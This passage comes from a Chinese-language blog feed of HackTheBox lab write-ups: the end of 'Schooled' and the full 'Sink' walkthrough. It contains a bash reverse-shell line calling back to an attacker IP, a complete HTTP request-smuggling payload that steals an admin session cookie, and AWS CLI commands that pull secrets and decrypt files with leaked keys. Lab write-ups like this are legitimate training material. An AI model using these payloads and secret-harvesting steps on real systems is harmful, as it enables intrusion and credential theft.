class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo -l</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911165429226.png" alt="image-20210911165429226"></p><p>看看咋提权：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911160729812.png" alt="image-20210911160729812"></p><p>这里只是敲了个id命令，我们需要一个root的shell，那就需要一点改造。</p><p>试了试反弹shell，显示啥 bad fd number，反正不能直接写命令进去</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911162936271.png" alt="image-20210911162936271"></p><p>那就用文件吧，将payload保存到<code>test.sh</code>里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.51/2333 0&gt;&amp;1&quot;</span> &gt; test.sh<br></code></pre></td></tr></table></figure><p>然后再打包，上传，安装，即可拿到root的shell：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911163009503.png" alt="image-20210911163009503"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911163022237.png" alt="image-20210911163022237"></p><h1 id="0x05-Summary"><a href="#0x05-Summary" class="headerlink" title="0x05 Summary"></a>0x05 Summary</h1><p>这是一个Medium难度的Linux靶机，主要考察内容如下：</p><ul><li>子域名收集</li><li>历史CVE利用</li><li>hashcat爆破密码</li><li>pkg命令提权</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Sink</title>
    <link href="/2021/12/07/HTB/Sink/"/>
    <url>/2021/12/07/HTB/Sink/</url>
    
    <content type="html"><![CDATA[<p>insane难度初体验 &amp; HTTP Smuggle攻击实操 &amp; 云渗透学习</p><h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sC -sV -v <span class="hljs-number">10.10.10.22</span><br></code></pre></td></tr></table></figure><p>发现端口22、3000、5000开启</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210924214339576.png" alt="image-20210924214339576"></p><p>访问3000端口，可以看到为某代码托管平台：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210924214601390.png" alt="image-20210924214601390"></p><p>目前没有用户名和密码，但是explore可以发现存在的三个账户信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210924215455065.png" alt="image-20210924215455065"></p><p>目光转向5000端口，注册并进行登录：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210924214613580.png" alt="image-20210924214613580"></p><p>对该网站进行探索，发现的交互点如下：</p><ol><li>首页最底下的评论功能：</li></ol><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210924215523796.png" alt="image-20210924215523796"></p><ol start="2"><li>首页的搜索功能：</li></ol><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210924215537392.png" alt="image-20210924215537392"></p><ol start="3"><li>笔记功能</li></ol><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210924215601360.png" alt="image-20210924215601360"></p><p>另外还能发现admin账户的信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210924220338832.png" alt="image-20210924220338832"></p><p>对这些存在交互的地方测试XSS，SQLi，SSTI，未果。</p><p>转变思路，先抓个包看看，可以发现存在的服务器信息，可以发现后端是<code>gunicorn</code>，然后代理使用了<code>haproxy</code>：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210924220539045.png" alt="image-20210924220539045"></p><h1 id="0x02-突破口"><a href="#0x02-突破口" class="headerlink" title="0x02 突破口"></a>0x02 突破口</h1><p>Google一下，可以看到HAProxy存在HTTP走私漏洞：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210927161101414.png" alt="image-20210927161101414"></p><p>对那篇文章进行总结，于此题而言，攻击原理和要点如下：</p><ol><li><p>正常情况下，对TE(Transfer-Encoding)头的优先级高于CL(Content-Length)头</p></li><li><p>在特殊字符<code>\v</code>的干扰下，haproxy没能识别出TE头，故遵照CL头的指示将构造的数据包中的所有内容发给了后端即Gunicorn。</p></li><li><p>Gunicorn不受<code>\v</code>的影响，因而将按TE头的指示以chunked的方式处理HTTP数据包。这种不一致造成了HTTP Smuggling攻击。</p></li><li><p>在实操过程中，默认的<code>Connection</code>头部值为<code>close</code>，我们需要将其改成<code>keep-alive</code>。这样会有更大概率接到admin用户提交的请求。</p></li></ol><p>实操开始，首先建议在burp中开启对不可打印字符的显示：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929211007548.png" alt="image-20210929211007548"></p><p>然后我们在TE头处插入<code>\v</code> ，方法是先用base64编码，然后在Burp中解码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">printf</span> \\x0b | <span class="hljs-built_in">base64</span><br><span class="hljs-comment">#输出 Cw==</span><br></code></pre></td></tr></table></figure><p>插入<code>\v</code>之后继续构造请求，步骤如下：</p><ol><li>按chunked方式构造请求，注意结束块处是<code>0\r\n\r\n</code></li><li>将一个正常的数据包贴在下面，msg留空来接收数据</li><li>更改第一个数据包的<code>Connection</code>头部值为<code>keep-alive</code></li><li>更改第二个数据包的CL头为一个较大的值，不然可能拿不到Cookie</li></ol><p>构造完成的数据包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/comment</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.225:5000<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>793<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.10.225:5000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.10.225:5000/home<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>lang=zh-CN; i_like_gitea=4218005f51d57007; _csrf=yEJpf7F8mA2tBXrSAu9dix741N86MTYzMjg4MzMxMjczNzA0NTY5MQ; session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.YVPnOg.hkrTsumKBoyp1jpSwxnWouyrNug<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-apache"><span class="hljs-attribute">8</span></span><br><span class="language-apache"><span class="hljs-attribute">msg</span>=test</span><br><span class="language-apache"><span class="hljs-attribute">0</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">POST</span> /comment HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span></span><br><span class="language-apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.10.10.225:5000</span></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">300</span></span><br><span class="language-apache"><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span></span><br><span class="language-apache"><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></span><br><span class="language-apache"><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">10.10.10.225:5000</span></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="language-apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">93</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4577</span>.<span class="hljs-number">63</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span></span><br><span class="language-apache"><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">10.10.10.225:5000</span>/home</span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span></span><br><span class="language-apache"><span class="hljs-attribute">Cookie</span>: lang=zh-CN; i_like_gitea=<span class="hljs-number">4218005</span>f51d57007; _csrf=yEJpf7F8mA2tBXrSAu9dix741N86MTYzMjg4MzMxMjczNzA0NTY5MQ; session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.YVPnOg.hkrTsumKBoyp1jpSwxnWouyrNug</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">msg</span>=</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929123824540.png" alt="image-20210929123824540"></p><p>发送数据包，拿到Cookie，替换后以admin账户身份登录站点：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929212909092.png" alt="image-20210929212909092"></p><p>在admin的note处可以发现三条凭证信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929124842229.png" alt="image-20210929124842229"></p><p>分别如下：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">Chef Login : <span class="hljs-type">http</span>://chef.sink.htb Username : <span class="hljs-type">chefadm</span> Password : /6&#x27;<span class="hljs-type">fEGC</span>&amp;zEx&#123;<span class="hljs-number">4</span>]zz<br>Dev Node URL : <span class="hljs-type">http</span>://code.sink.htb Username : <span class="hljs-type">root</span> Password : <span class="hljs-type">FaH</span>@<span class="hljs-number">3</span>L&gt;Z3&#125;)zzfQ3<br>Nagios URL : <span class="hljs-type">https</span>://nagios.sink.htb Username : <span class="hljs-type">nagios_adm</span> Password : <span class="hljs-type">g8</span>&lt;H6GK\&#123;*L.fB3C<br></code></pre></td></tr></table></figure><p>第二条记录可以让我们登录进3000端口的gitea。</p><p>在Explore中，可以看到该代码托管平台中存在的4个repo：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929130214716.png" alt="image-20210929130214716"></p><p>其中，在Key_Management项目下的ec2.php中查看提交的历史记录，可以发现开发人员由于失误上传的私钥文件：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929131106016.png" alt="image-20210929131106016"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929213332811.png" alt="image-20210929213332811"></p><p>以及aws的<code>access_id</code>和<code>access_secret</code>：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929144333190.png" alt="image-20210929144333190"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929144609360.png" alt="image-20210929144609360"></p><p>保存私钥，<code>chmod 600</code> 后登录之，成功，拿到user.txt：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929213539864.png" alt="image-20210929213539864"></p><h1 id="0x03-David’s-shell"><a href="#0x03-David’s-shell" class="headerlink" title="0x03 David’s shell"></a>0x03 David’s shell</h1><p>查看一下网络连接状态：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">netstat -tulnp <span class="hljs-comment">#这条命令能够看到docker容器，初步排查后确定这不是我们的关注点</span><br><br>netstat -tulnp | <span class="hljs-keyword">grep</span> <span class="hljs-number">127</span> <span class="hljs-comment"># 只看127.0.0.1</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929145011428.png" alt="image-20210929145011428"></p><p>可以看到有个4566端口，结合之前我们发现的代码，不难推测上面跑着一个aws服务。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929150225487.png" alt="image-20210929150225487"></p><p>但这个地址有些奇怪，搜一下4566端口，可以发现有个localstack，查找资料后得知这就是一个模拟aws云服务的应用，用于云应用的开发和测试。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929214848290.png" alt="image-20210929214848290"></p><p>然后看下命令，可以发现有<code>aws</code>和<code>awslocal</code>。</p><p><code>aws</code>和<code>awslocal</code>的区别是<code>aws</code>需要指定endpoint，<code>awslocal</code>不用。<code>awslocal</code>会直接和localstack进行对话。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929150039151.png" alt="image-20210929150039151"></p><p>对aws渗透中常见的<code>lambda</code>、<code>cloudwatch</code>、<code>s3api</code>函数进行测试，发现似乎都没开启相应的服务：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">awslocal</span> <span class="hljs-string">lambda</span> <span class="hljs-built_in">list-functions</span><br><span class="hljs-string">awslocal</span> <span class="hljs-string">cloudwatch</span> <span class="hljs-built_in">list-dashboards</span><br><span class="hljs-string">awslocal</span> <span class="hljs-string">s3api</span> <span class="hljs-built_in">list-buckets</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929215654596.png" alt="image-20210929215654596"></p><p>由于如上项目与logs有关，使用命令<code>logs</code>模块下的命令对logs进行探索。</p><p>如果不清楚命令的话，aws的读命令大多与get、list、describe有关，搜索如下关键字即可快速帮助我们确定命令</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">awslocal logs help| <span class="hljs-type">grep</span> -E &#x27;list|<span class="hljs-type">get</span>|<span class="hljs-type">describe</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929220227493.png" alt="image-20210929220227493"></p><p>使用命令</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">awslocal logs <span class="hljs-built_in">describe</span>-<span class="hljs-built_in">log</span>-groups<br></code></pre></td></tr></table></figure><p>可以找到一个<code>log-group</code></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929163131899.png" alt="image-20210929163131899"></p><p>进一步通过该<code>log-group</code>，可以找到一个<code>log-stream</code></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">awslocal logs describe-<span class="hljs-built_in">log</span>-streams --<span class="hljs-built_in">log</span>-<span class="hljs-built_in">group</span>-<span class="hljs-built_in">name</span> cloudtrail<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929164540284.png" alt="image-20210929164540284"></p><p>再进一步查看，得到一些有意思的事件名称：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">awslocal</span> <span class="hljs-string">logs</span> <span class="hljs-built_in">get-log-events</span> <span class="hljs-built_in">--log-group-name</span> <span class="hljs-string">cloudtrail</span> <span class="hljs-built_in">--log-stream-name</span> <span class="hljs-string">20201222</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929164646600.png" alt="image-20210929164646600"></p><p>Google一下，可以发现和aws的<code>Secrets Manager</code>有关：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929164714439.png" alt="image-20210929164714439"></p><p>同时aws的cli也有该命令</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929164742776.png" alt="image-20210929164742776"></p><p>同样地，先看看有用的命令：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">awslocal secretsmanager help| <span class="hljs-type">grep</span> -E &#x27;list|<span class="hljs-type">get</span>|<span class="hljs-type">describe</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929220908301.png" alt="image-20210929220908301"></p><p>然后使用之前泄露的<code>access_id</code>和<code>access_secret</code>进行配置：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929163728174.png" alt="image-20210929163728174"></p><p>配置之后尝试列出所有的secrets：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">awslocal secretsmanager list-secrets</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929165058613.png" alt="image-20210929165058613"></p><p>之后分别拿到secrets的value值：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">awslocal</span> <span class="hljs-string">secretsmanager</span> <span class="hljs-built_in">get-secret-value</span> <span class="hljs-built_in">--secret-id</span> <span class="hljs-string">&#x27;Jenkins Login&#x27;</span><br><span class="hljs-string">awslocal</span> <span class="hljs-string">secretsmanager</span> <span class="hljs-built_in">get-secret-value</span> <span class="hljs-built_in">--secret-id</span> <span class="hljs-string">&#x27;Sink Panel&#x27;</span><br><span class="hljs-string">awslocal</span> <span class="hljs-string">secretsmanager</span> <span class="hljs-built_in">get-secret-value</span> <span class="hljs-built_in">--secret-id</span> <span class="hljs-string">&#x27;Jira Support&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929165327601.png" alt="image-20210929165327601"></p><p>对具有登录权限的用户进行查看，发现有root、marcus、david。刚好上面拿到的账号中也有一个david。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929165428416.png" alt="image-20210929165428416"></p><p>使用密码登录，拿到david的shell：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929223048356.png" alt="image-20210929223048356"></p><h1 id="0x04-提权至root"><a href="#0x04-提权至root" class="headerlink" title="0x04 提权至root"></a>0x04 提权至root</h1><p>在david家目录的某个文件夹底下能够发现一个<code>servers.enc</code>文件：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929223318515.png" alt="image-20210929223318515"></p><p>那就想着法子解密咯。回到之前的gitea，在Key_Management目录下能够发现有一个keys.php，可以看出它在与aws的kms服务进行交互：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210930112614166.png" alt="image-20210930112614166"></p><p>Google一下，可以发现是aws的密钥管理服务，里面可能有我们想要的东西：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210930113055733.png" alt="image-20210930113055733"></p><p>回到服务器，查看可用的命令：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">awslocal kms help| <span class="hljs-type">grep</span> -E &#x27;get|<span class="hljs-type">describe</span>|<span class="hljs-type">list</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929191913606.png" alt="image-20210929191913606"></p><p>首先看下存在的密钥：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">awslocal kms list-keys</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210930113232328.png" alt="image-20210930113232328"></p><p>先查看某一密钥的详细信息：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">awslocal kms <span class="hljs-built_in">describe</span>-<span class="hljs-built_in">key</span> --<span class="hljs-built_in">key</span>-id <span class="hljs-number">0b539917</span>-5eff-<span class="hljs-number">45b2</span>-9fa1-e13f0d2c42ac<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929192238621.png" alt="image-20210929192238621"></p><p>可以观察到有一<code>Keystate</code>字样，我们需要查找<code>Keystate</code>为<code>Enabled</code>的密钥。</p><p>写个简单的shell语句进行查找：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">for</span> <span class="hljs-string">i</span> <span class="hljs-string">in</span> $(<span class="hljs-string">awslocal</span> <span class="hljs-string">kms</span> <span class="hljs-built_in">list-keys</span> | <span class="hljs-string">grep</span> <span class="hljs-string">KeyId</span> | <span class="hljs-string">awk</span> -<span class="hljs-string">F</span>\<span class="hljs-string">&quot; &#x27;&#123;print $4;&#125;&#x27;); do awslocal kms describe-key --key-id $i | grep -E &#x27;KeyId|Enabled&#x27; ; echo; done;</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929201726591.png" alt="image-20210929201726591"></p><p>对<code>State</code>为<code>Enabled</code>状态的key进行查看：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">awslocal kms <span class="hljs-built_in">describe</span>-<span class="hljs-built_in">key</span> --<span class="hljs-built_in">key</span>-id 804125db-bdf1-465a-a058-<span class="hljs-number">07fc87c0fad0</span><br>awslocal kms <span class="hljs-built_in">describe</span>-<span class="hljs-built_in">key</span> --<span class="hljs-built_in">key</span>-id c5217c17-<span class="hljs-number">5675</span>-42f7-a6ec-b5aa9b9dbbde<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929201930968.png" alt="image-20210929201930968"></p><p>我们使用第一个命令对得到的文件进行解密。首先使用<code>help</code>命令查看<code>decrypt</code>方法的使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws kms decrypt <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929202230740.png" alt="image-20210929202230740"></p><p>对着example构造我们的语句即可：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929202659887.png" alt="image-20210929202659887"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">awslocal kms decrypt <span class="hljs-params">--ciphertext-blob</span> fileb:<span class="hljs-string">//servers.enc</span> <span class="hljs-params">--key-id</span> 804125db-bdf1-465a-a058-07fc87c0fad0 <span class="hljs-params">--encryption-algorithm</span> RSAES_OAEP_SHA_256<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929202747680.png" alt="image-20210929202747680"></p><p>将得到的<code>base64</code>语句解码放进文件里，并使用<code>file</code>命令查看文件类型：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">echo &lt;base64code&gt; | base64 -d &gt; <span class="hljs-literal">result</span><br><span class="hljs-built_in">file</span> <span class="hljs-literal">result</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929202955087.png" alt="image-20210929202955087"></p><p>解压后继续查看文件类型：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">mv <span class="hljs-literal">result</span> <span class="hljs-literal">result</span>.gz<br>gzip -d <span class="hljs-literal">result</span>.gz<br>ll<br><span class="hljs-built_in">file</span> <span class="hljs-literal">result</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210930114528281.png" alt="image-20210930114528281"></p><p>继续解压即可拿到密码：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">mv <span class="hljs-literal">result</span> <span class="hljs-literal">result</span>.tar<br>tar -xvf <span class="hljs-literal">result</span><br>cat servers.yml<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210929203757742.png" alt="image-20210929203757742"></p><p>拿到此密码即可登录root用户：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/img/Sink.assets/image-20210930114707304.png" alt="image-20210930114707304"></p><h1 id="0x05-Summary"><a href="#0x05-Summary" class="headerlink" title="0x05 Summary"></a>0x05 Summary</h1><p>这是一个Insane难度的Linux靶机，主要考察内容如下：</p><ul><li>HTTP Smuggle攻击</li><li>git利用</li><li>aws云渗透</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Spider</title>
    <link href="/2021/12/07/HTB/Spider/"/>
